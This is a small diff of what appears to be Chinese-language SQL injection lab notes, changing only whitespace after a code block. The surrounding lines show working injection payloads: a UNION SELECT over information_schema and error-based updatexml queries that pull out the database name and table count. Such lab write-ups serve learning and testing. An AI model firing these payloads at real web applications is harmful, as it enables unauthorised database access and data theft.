@@ -95,7 +95,7 @@ id=1' union select 1,2,group_concat(table_name,'_',column_name) from information
 1#查询数据库名字，数据库名字为security（用户user()；版本version()）</br>
 ```
 ?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
-```     
+```
 2#查询数据库有多少个表</br>
 ```
 ?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23  
